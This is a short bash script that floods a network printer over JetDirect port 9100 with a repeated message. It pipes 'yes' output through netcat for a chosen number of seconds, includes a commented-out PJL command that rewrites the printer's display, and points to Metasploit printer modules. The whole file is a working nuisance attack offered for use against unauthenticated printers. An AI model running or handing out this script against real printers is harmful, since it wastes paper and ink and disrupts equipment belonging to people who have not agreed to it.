#!/bin/bash
#Print page after page filled line by line with your message
#Works with printers that support JetDirect(Port 9100 open)
#Dont forget to cancel the print job before you run out of ink/paper...
#Also check out the metasploit modules for this topic - auxiliary/scanner/printer/

#Choose default message
defaultprinter='192.168.1.106'
defaultprinterlcd='Printer Spam!'
defaultmessage='All your prints are belong to us!'
defaultspamtime='1'

read -e -i $defaultprinter -p 'Please enter IP of Printer: ' printer
#read -e -i "$defaultprinterlcd" -p 'Enter message to display on LCD: ' printerlcd
read -e -i "$defaultmessage" -p 'Enter message to print: ' messageinput
read -e -i $defaultspamtime -p 'Enter time in seconds to spam printer: ' spamtime

echo 'Spamming printer...'
#echo @PJL RDYMSG DISPLAY=\""$printerlcd"\" | nc -q 0 $printer 9100
#sleep 1
yes $messageinput | nc -q 0 $printer 9100& sleep $spamtime; kill $!
sleep 1
echo '' | nc -q 0 $printer 9100
echo 'done.'
